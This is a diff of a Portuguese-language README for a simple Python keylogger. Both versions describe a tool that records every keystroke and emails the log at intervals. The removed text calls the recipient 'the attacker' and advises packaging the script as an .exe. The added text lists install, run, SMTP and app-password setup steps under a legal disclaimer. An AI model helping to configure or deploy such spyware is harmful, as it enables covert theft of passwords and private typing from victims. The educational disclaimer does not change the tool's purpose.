@@ -1,26 +1,43 @@
-<h1 align="center"> PYKEYLOG </h1>
-Keylogger em Python, feito da forma mais simples possível para copiar as teclas pressionadas e enviar a cada 12 horas para o e-mail do atacante.
-# Como usar:
+# Keylogger Simples em Python
 
-Altere: 
-```
-EMAIL_ADDRESS = "youremail@example.com"
-``` e
-```EMAIL_PASSWORD = "yourpassword"
-```
-Altere também na linha 34: server = smtplib.SMTP(host="smtp-mail.outlook.com", port=587) - para o smtp e porta do email que você for usar
-Você também pode alterar o intervado de tempo que o e-mail será enviado com as teclas pressionadas em: SEND_REPORT_EVERY = 43200  # (seconds)
-No meu caso, para não ficar chegando muitos emails, coloquei para receber a cada 12 horas. Use sempre em segundos.
+Este repositório contém um script de keylogger simples escrito em Python. Ele registra todas as teclas pressionadas no teclado e envia um relatório via e-mail em intervalos regulares.
 
-# Lembre-se:
-Importar as bibliotecas:
-smtplib
-pynput
-threading
-email.mime.text
+## ⚠️ Aviso Legal
 
-## USE COM RESPONSABILIDADE!
+O uso de um keylogger é legalmente e eticamente questionável. Este código é fornecido apenas para fins educacionais e não deve ser usado para atividades mal-intencionadas. Nunca use este código sem o consentimento explícito do proprietário do computador onde ele está sendo executado.
 
-# Transformar em .exe
-Após a finalização do script, utilizei auto_py_to_exe para transformar o arquivo py em exe.
-Enjoy
+## 🚀 Como executar
+
+1. Instale as dependências necessárias com o comando:
+
+    ```shell
+    pip install -r requirements.txt
+    ```
+
+2. Substitua as constantes `EMAIL_ADDRESS` e `EMAIL_PASSWORD` no script `keylogger.py` pelas suas informações de login de e-mail.
+
+3. Execute o script `keylogger.py`:
+
+    ```shell
+    python keylogger.py
+    ```
+
+## ⏱️ Configuração do intervalo de relatório
+
+Por padrão, o script envia um relatório por e-mail a cada 12 horas. Você pode alterar este intervalo modificando a constante `SEND_REPORT_EVERY` no script `keylogger.py`. O valor é especificado em segundos.
+
+## 📧 Configuração do e-mail
+
+O script está configurado para usar o servidor SMTP do Outlook.com para enviar e-mails. Se você estiver usando um provedor de e-mail diferente, você precisará alterar o host e a porta na chamada `smtplib.SMTP` na função `sendmail`.
+
+## 🔑 Senha do aplicativo
+
+Se você ativou a verificação em duas etapas na sua conta de e-mail, você precisará gerar uma senha de aplicativo para usar no script. Você pode fazer isso através da página de segurança da sua conta de e-mail.
+
+## 📋 Formato do log de teclas
+
+O script registra cada pressionamento de tecla como um caractere na string de log. Teclas especiais (como espaço, enter, e teclas de função) são registradas como palavras entre colchetes (por exemplo, `[ENTER]`, `[SPACE]`). O script envia esta string de log como o corpo do e-mail de relatório.
+
+## 📄 Licença
+
+Este projeto é licenciado sob a licença MIT. Veja o arquivo `LICENSE` para mais detalhes.
